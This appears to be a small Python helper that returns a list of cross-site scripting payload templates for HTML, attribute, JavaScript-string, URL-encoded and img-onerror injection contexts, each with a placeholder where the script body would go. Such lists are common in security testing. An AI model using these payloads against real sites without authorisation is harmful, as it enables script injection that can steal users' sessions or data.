def generate_xss():

    payloads = [

        # HTML Context
        "<script>/*XSS_TEMPLATE*/</script>",

        # Attribute Context
        "\" onmouseover=\"XSS_TEMPLATE\"",

        # JS Context
        "'; XSS_TEMPLATE //",

        # Encoded Example
        "%3Cscript%3EXSS_TEMPLATE%3C/script%3E",

        # Tag Switching
        "<img src=x onerror=XSS_TEMPLATE>"

    ]

    return payloads
